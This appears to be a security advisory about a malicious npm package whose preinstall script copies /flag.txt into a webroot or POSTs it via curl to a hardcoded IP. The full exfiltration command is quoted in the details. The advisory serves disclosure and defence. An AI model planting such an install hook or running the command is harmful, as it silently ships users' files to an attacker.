summary: preinstall hook exfiltrates /flag.txt to hardcoded remote IP
details: The package's npm preinstall lifecycle script reads /flag.txt from the installer's filesystem and POSTs its contents to a hardcoded bare-IP endpoint over plain HTTP (http://10.107.121.85:8000/flag). The full preinstall command is `cp /flag.txt /app/public/static/flag.txt || cp /flag.txt /app/static/flag.txt || curl -X POST -d @/flag.txt http://10.107.121.85:8000/flag`, which runs automatically on `npm install` with no user consent. The package name and behavior are consistent with a CTF/probe-style supply-chain exfiltration: a fixed host file is read and shipped off-machine to an attacker-controlled IP. Any developer or build system that installs this package leaks the contents of /flag.txt (or stages it into a webroot for later retrieval) to the attacker.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
